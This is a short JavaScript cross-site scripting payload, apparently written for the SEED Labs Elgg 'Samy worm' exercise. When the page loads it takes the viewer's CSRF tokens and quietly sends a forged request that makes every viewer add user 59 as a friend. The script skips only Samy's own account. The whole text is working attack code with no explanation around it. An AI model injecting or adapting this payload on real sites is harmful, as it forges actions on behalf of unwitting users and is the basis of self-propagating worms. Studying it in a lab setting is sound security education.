<script type="text/javascript">
window.onload = function () {
    var friend_id = 59;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var sendurl = "http://www.seed-server.com/action/friends/add?friend=" + friend_id + ts + token;

    // Prevent Samy from sending a request to himself
    var samyGuid = "59";
    if (elgg.session.user.guid != samyGuid) {
        var Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
};
</script>
